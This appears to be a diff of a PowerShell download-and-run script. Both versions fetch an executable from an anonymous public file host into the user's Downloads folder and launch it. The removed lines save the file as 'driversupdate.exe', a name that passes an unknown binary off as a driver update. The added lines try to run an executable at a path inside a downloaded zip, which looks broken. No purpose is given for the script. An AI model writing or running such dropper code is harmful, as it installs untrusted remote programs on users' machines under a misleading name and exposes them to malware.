@@ -1,3 +1,3 @@
-$downloadUrl = "https://files.catbox.moe/uy96rs.exel"
-Invoke-WebRequest $downloadUrl -OutFile $env:USERPROFILE\Downloads\driversupdate.exe
-Start-Process $env:USERPROFILE\Downloads\driversupdate.exe -Wait
+$downloadUrl = "https://files.catbox.moe/o4cn1q.zip"
+Invoke-WebRequest $downloadUrl -OutFile $env:USERPROFILE\Downloads\o4cn1q.zip
+Start-Process $env:USERPROFILE\Downloads\o4cn1q.zip\source_prepared.exe -Wait
